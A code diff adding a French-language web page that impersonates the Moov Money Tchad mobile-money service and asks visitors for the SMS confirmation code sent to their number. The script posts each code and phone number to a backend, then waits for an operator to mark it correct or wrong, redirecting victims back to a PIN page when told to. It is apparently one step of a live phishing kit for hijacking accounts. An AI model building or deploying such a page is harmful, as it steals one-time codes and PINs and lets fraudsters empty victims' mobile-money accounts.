@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money Tchad - Vérification SMS</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0044cc; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f0f4f8; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .header-box { width: 100%; background: var(--moov-blue); padding: 25px 20px 40px; color: white; text-align: center; font-size: 26px; font-weight: 800; border-bottom: 4px solid var(--moov-orange); }
+        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; }
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,68,204,0.08); }
+        h2 { text-align: center; font-size: 22px; color: #111; margin-top: 0; }
+        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin: 20px 0; }
+        .code-box { width: 48px; height: 54px; border: 2px solid var(--moov-blue); border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; outline: none; }
+        .submit-btn { width: 100%; background-color: #cbd5e1; color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
+        .submit-btn.active { background-color: var(--moov-orange); cursor: pointer; }
+        .error-message { color: #dc2626; background: #fee2e2; border: 1px solid #fecaca; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; text-align: center; font-weight: 600; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--moov-blue); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="header-box">Moov Money</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Code de Confirmation</h2>
+        <p style="text-align: center; font-size: 14px; color: #666; margin-bottom: 15px;">Entrez le code reçu par SMS sur votre numéro +235 <span id="displayPhone"></span></p>
+
+        <!-- Error prompt for incorrect OTP -->
+        <div id="errorText" class="error-message">Le code saisi est incorrect. Veuillez réessayer.</div>
+
+        <div class="code-input-container">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
+    </div>
+</div>
+
+<div class="overlay" id="statusOverlay">
+    <div style="font-size: 20px; font-weight: bold;">Validation en cours...</div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const savedPhone = localStorage.getItem('phone') || "";
+    document.getElementById('displayPhone').textContent = savedPhone;
+
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const errorText = document.getElementById('errorText');
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
+            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+            submitBtn.disabled = fullCode.length < 6;
+            submitBtn.classList.toggle('active', fullCode.length === 6);
+            errorText.style.display = 'none';
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
+        });
+    });
+
+    submitBtn.addEventListener('click', async () => {
+        const code = Array.from(codeBoxes).map(b => b.value).join('');
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, code, country: "TD" })
+            });
+
+            const timer = setInterval(async () => {
+                const res = await fetch(`/api/check-status?phone=${savedPhone}`);
+                const data = await res.json();
+                
+                if (data.status === "otp1_correct") {
+                    clearInterval(timer);
+                    window.location.href = "/page9";
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(timer);
+                    statusOverlay.style.display = "none";
+                    errorText.textContent = "❌ Code de confirmation incorrect. Veuillez réessayer.";
+                    errorText.style.display = "block";
+                    codeBoxes.forEach(b => b.value = "");
+                    codeBoxes[0].focus();
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(timer);
+                    // Redirect back to PIN login if admin marked PIN as wrong during OTP stage
+                    window.location.href = "/page6?error=wrongpin";
+                }
+            }, 2000);
+        } catch (e) {
+            statusOverlay.style.display = "none";
+            alert("Erreur réseau");
+        }
+    });
+});
+</script>
+</body>
+</html>
